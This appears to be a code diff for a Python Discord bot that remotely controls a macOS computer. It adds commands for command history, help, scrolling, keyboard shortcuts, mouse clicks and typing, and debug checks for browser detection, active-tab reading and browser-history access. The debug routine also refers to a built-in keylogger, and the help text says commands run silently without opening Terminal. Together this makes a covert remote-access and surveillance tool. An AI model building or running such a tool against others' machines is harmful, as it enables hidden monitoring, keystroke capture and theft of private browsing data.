+    except Exception as e:
+        logger.error(f"Error in cmd command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error executing command: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error executing command: {str(e)}")
+        except Exception:
+            pass
+
+@bot.tree.command(name='cmd-history', description='Show recent command execution history')
+@discord.app_commands.describe(
+    limit='Number of recent commands to show (default: 10, max: 20)'
+)
+async def cmd_history_command(interaction: discord.Interaction, limit: int = 10):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
+    
+    try:
+        global command_history
+        
+        if not command_history:
+            await interaction.response.send_message("📜 **Command History Empty**\n\nNo commands have been executed yet. Use `/cmd` to run your first command!")
+            return
+        
+        # Validate limit
+        if limit > 20:
+            limit = 20
+        elif limit < 1:
+            limit = 1
+        
+        # Get recent commands
+        recent_commands = command_history[-limit:]
+        
+        # Format history
+        response = f"📜 **Recent Command History** (last {len(recent_commands)} commands)\n\n"
+        
+        for i, entry in enumerate(reversed(recent_commands), 1):
+            status_emoji = "✅" if entry['success'] else "❌"
+            response += f"**{i}.** {status_emoji} `{entry['command'][:60]}{'...' if len(entry['command']) > 60 else ''}`\n"
+            response += f"    🕐 {entry['timestamp']} | ⏱️ {entry['duration']:.2f}s | 📤 Exit: {entry['returncode']}\n\n"
+        
+        await interaction.response.send_message(response)
+        
+    except Exception as e:
+        logger.error(f"Error in cmd-history command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error retrieving command history: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error retrieving command history: {str(e)}")
+        except Exception:
+            pass
+
+@bot.tree.command(name='cmd-help', description='Show help and examples for safe command usage')
+async def cmd_help_command(interaction: discord.Interaction):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
+    
+    try:
+        help_text = """
+🛠️ **Command Execution Help**
+
+**Basic Usage:**
+`/cmd "command here"`
+`/cmd "ls -la" 60 ~/Documents`  (with timeout and directory)
+
+**Built-in Aliases:**
+• `sysinfo` - System hardware information
+• `processes` - Running processes list
+• `diskspace` - Disk usage information
+• `memory` - Memory statistics
+• `network` - Network routing table
+• `listening` - Listening network ports
+• `uptime` - System uptime
+• `users` - Currently logged users
+• `kernel` - Kernel version information
+• `osversion` - macOS version details
+
+**Safe Command Examples:**
+• `ls -la ~/Desktop` - List desktop files
+• `ps aux | head -20` - Show running processes
+• `df -h` - Show disk space
+• `netstat -an | grep LISTEN` - Show listening ports
+• `find ~/Downloads -name "*.pdf"` - Find PDF files
+• `cat ~/Desktop/file.txt` - Read text file
+• `which python3` - Find command location
+• `echo $PATH` - Show PATH variable
+• `date` - Current date and time
+
+**Working Directories:**
+• `home` - Your home directory
+• `desktop` - Desktop folder
+• `documents` - Documents folder
+• `downloads` - Downloads folder
+• `~/path` - Any path starting with ~
+• `/full/path` - Any absolute path
+
+**Security Notes:**
+• Sudo commands are blocked for safety
+• System modification commands are blocked
+• Dangerous file operations are prevented
+• Commands timeout after specified seconds
+• All executions run in background (no visible terminal)
+
+**Tips:**
+• Use quotes around commands with spaces
+• Check `/cmd-history` to see recent executions
+• Commands run silently without opening Terminal
+• Large outputs are saved to files automatically
+"""
+        await interaction.response.send_message(help_text)
+        
+    except Exception as e:
+        logger.error(f"Error in cmd-help command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error displaying command help: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error displaying command help: {str(e)}")
+        except Exception:
+            pass
+
 @bot.tree.command(name='debug', description='Test all system functions')
 async def debug(interaction: discord.Interaction):
     # Check if command is used in pc-monitor channel
@@ -2201,7 +4185,253 @@ async def debug(interaction: discord.Interaction):
     except Exception as e:
         tb = traceback.format_exc()
         results.append(f'🔴 Keylogger: FAIL\n{str(e)}\n```{tb}```')
+    # Browser detection test
+    try:
+        browsers = get_running_browsers()
+        if browsers:
+            results.append(f'🟢 Browser Detection: OK ({len(browsers)} running: {", ".join(browsers)})')
+        else:
+            results.append('🟡 Browser Detection: OK (no browsers running)')
+    except Exception as e:
+        results.append(f'🔴 Browser Detection: FAIL\n{str(e)}')
+    # Active tab test
+    try:
+        active_info = get_active_website_info()
+        if active_info:
+            results.append(f'🟢 Active Tab Detection: OK ({active_info["browser"]})')
+        else:
+            results.append('🟡 Active Tab Detection: OK (no active tabs)')
+    except Exception as e:
+        results.append(f'🔴 Active Tab Detection: FAIL\n{str(e)}')
+    # Browser history test
+    try:
+        history = get_browser_history("all", 1, 1)  # Test with minimal parameters
+        if history:
+            results.append(f'🟢 Browser History Access: OK ({len(history)} entries found)')
+        else:
+            results.append('🟡 Browser History Access: OK (no history found - may need Full Disk Access)')
+    except Exception as e:
+        results.append(f'🔴 Browser History Access: FAIL\n{str(e)}')
+    # Open functionality test
+    try:
+        # Test basic target validation and app name resolution
+        test_apps = ['calculator', 'nonexistentapp12345']
+        working_apps = []
+        for app in test_apps:
+            resolved = resolve_app_name(app)
+            if resolved != app:  # App was resolved from alias
+                working_apps.append(f"{app} → {resolved}")
+        
+        if working_apps:
+            results.append(f'🟢 Open Functionality: OK (App resolution working)')
+        else:
+            results.append('🟡 Open Functionality: OK (Basic validation working)')
+    except Exception as e:
+        results.append(f'🔴 Open Functionality: FAIL\n{str(e)}')
+    # PyAutoGUI test
+    try:
+        # Test screen size detection and basic validation
+        screen_size = get_screen_size()
+        if screen_size:
+            width, height = screen_size
+            results.append(f'🟢 PyAutoGUI: OK (Screen size: {width}x{height}, failsafe enabled)')
+        else:
+            results.append('🔴 PyAutoGUI: FAIL (Could not get screen size)')
+    except Exception as e:
+        results.append(f'🔴 PyAutoGUI: FAIL\n{str(e)}')
+    # Scroll functionality test
+    try:
+        # Test scroll validation without actually scrolling
+        screen_size = get_screen_size()
+        if screen_size:
+            width, height = screen_size
+            # Test coordinate validation logic without actually scrolling
+            test_x, test_y = width // 2, height // 2  # Use center of screen
+            if (0 <= test_x < width and 0 <= test_y < height and 
+                1 <= 5 <= 20 and 'up' in ['up', 'down']):  # Test validation logic
+                results.append('🟢 Scroll Function: OK (Validation logic working)')
+            else:
+                results.append('🟡 Scroll Function: OK (Basic validation available)')
+        else:
+            results.append('🟡 Scroll Function: Limited (Cannot determine screen size)')
+    except Exception as e:
+        results.append(f'🔴 Scroll Function: FAIL\n{str(e)}')
+    # Hotkey functionality test
+    try:
+        # Test hotkey parsing and validation without executing
+        test_keys = ['command+c', 'ctrl+alt+t', 'fn+f3']
+        working_keys = []
+        for key_combo in test_keys:
+            # Test key parsing only (don't execute)
+            keys = [key.strip().lower() for key in key_combo.split('+')]
+            key_aliases = {'cmd': 'command', 'control': 'ctrl', 'option': 'alt', 'meta': 'command'}
+            resolved_keys = [key_aliases.get(key, key) for key in keys]
+            
+            # Check if all keys are valid
+            if all(key in pyautogui.KEYBOARD_KEYS for key in resolved_keys):
+                working_keys.append(key_combo)
+        
+        if working_keys:
+            results.append(f'🟢 Shortcut Function: OK (Key validation working for {len(working_keys)}/{len(test_keys)} test cases)')
+        else:
+            results.append('🟡 Shortcut Function: OK (Basic function available)')
+    except Exception as e:
+        results.append(f'🔴 Shortcut Function: FAIL\n{str(e)}')
+    # Command execution test
+    try:
+        # Test command validation and alias resolution
+        test_result = validate_command_safety("ls -la")
+        alias_result = resolve_command_alias("sysinfo")
+        
+        if test_result[0] and alias_result != "sysinfo":
+            results.append('🟢 Command Execution: OK (Validation and aliases working)')
+        else:
+            results.append('🟡 Command Execution: OK (Basic functions working)')
+    except Exception as e:
+        results.append(f'🔴 Command Execution: FAIL\n{str(e)}')
     await interaction.followup.send('\n'.join(results))
+
+@bot.tree.command(name='scroll', description='Scroll mouse wheel at coordinates or current position')
+@discord.app_commands.describe(
+    clicks='Number of scroll clicks (1-20)',
+    direction='Scroll direction',
+    x='X coordinate (optional, uses current position if not specified)',
+    y='Y coordinate (optional, uses current position if not specified)'
+)
+@discord.app_commands.choices(direction=[
+    discord.app_commands.Choice(name='Scroll Up', value='up'),
+    discord.app_commands.Choice(name='Scroll Down', value='down')
+])
+async def scroll_command(interaction: discord.Interaction, clicks: int, direction: discord.app_commands.Choice[str], x: int = None, y: int = None):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
+    
+    try:
+        await interaction.response.defer()
+        
+        # Handle direction parameter (could be Choice object or string)
+        direction_value = direction.value if hasattr(direction, 'value') else direction
+        
+        success, message = scroll_at_coordinates(x, y, clicks, direction_value)
+        
+        if success:
+            await interaction.followup.send(f"📜 {message}")
+        else:
+            await interaction.followup.send(f"❌ {message}")
+            
+    except Exception as e:
+        logger.error(f"Error in scroll command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error scrolling: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error scrolling: {str(e)}")
+        except Exception:
+            pass
+
+@bot.tree.command(name='shortcut', description='Execute keyboard shortcuts - use + to separate keys (e.g., command+c, fn+f3, shift+tab)')
+@discord.app_commands.describe(
+    keys='Keys separated by + (examples: command+c, ctrl+shift+t, fn+f3, alt+tab)'
+)
+async def shortcut_command(interaction: discord.Interaction, keys: str):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
+    
+    try:
+        await interaction.response.defer()
+        
+        success, message = execute_hotkey(keys)
+        
+        if success:
+            await interaction.followup.send(f"⌨️ {message}")
+        else:
+            await interaction.followup.send(f"❌ {message}")
+            
+    except Exception as e:
+        logger.error(f"Error in shortcut command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error executing shortcut: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error executing shortcut: {str(e)}")
+        except Exception:
+            pass
+
+@bot.tree.command(name='click', description='Click at screen coordinates with mouse button (supports long clicks)')
+@discord.app_commands.describe(
+    x='X coordinate on screen',
+    y='Y coordinate on screen', 
+    button='Mouse button to use',
+    clicks='Number of clicks (1-10)',
+    hold_duration='Hold duration in seconds (0-10, default 0 for normal click)'
+)
+@discord.app_commands.choices(button=[
+    discord.app_commands.Choice(name='Left Click', value='left'),
+    discord.app_commands.Choice(name='Right Click', value='right'),
+    discord.app_commands.Choice(name='Middle Click', value='middle')
+])
+async def click_command(interaction: discord.Interaction, x: int, y: int, button: discord.app_commands.Choice[str] = 'left', clicks: int = 1, hold_duration: float = 0.0):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
+    
+    try:
+        await interaction.response.defer()
+        
+        # Handle button parameter (could be Choice object or string)
+        button_value = button.value if hasattr(button, 'value') else button
+        
+        success, message = click_at_coordinates(x, y, button_value, clicks, hold_duration)
+        
+        if success:
+            await interaction.followup.send(f"🖱️ {message}")
+        else:
+            await interaction.followup.send(f"❌ {message}")
+            
+    except Exception as e:
+        logger.error(f"Error in click command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error clicking: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error clicking: {str(e)}")
+        except Exception:
+            pass
+
+@bot.tree.command(name='type', description='Type text with support for special keys (\\n for Enter, \\t for Tab)')
+@discord.app_commands.describe(
+    text='Text to type (use \\n for Enter key, \\t for Tab key, max 1000 chars)'
+)
+async def type_command(interaction: discord.Interaction, text: str):
+    # Check if command is used in pc-monitor channel
+    if not is_pc_monitor_channel(interaction):
+        await interaction.response.send_message("❌ This command can only be used in the #pc-monitor channel.")
+        return
+    
+    try:
+        await interaction.response.defer()
+        
+        success, message = type_text(text)
+        
+        if success:
+            await interaction.followup.send(f"⌨️ {message}")
+        else:
+            await interaction.followup.send(f"❌ {message}")
+            
+    except Exception as e:
+        logger.error(f"Error in type command: {str(e)}")
+        try:
+            if not interaction.response.is_done():
+                await interaction.response.send_message(f"❌ Error typing: {str(e)}")
+            else:
+                await interaction.followup.send(f"❌ Error typing: {str(e)}")
+        except Exception:
+            pass
 
 # run the bot
 logger.info('Starting bot...')
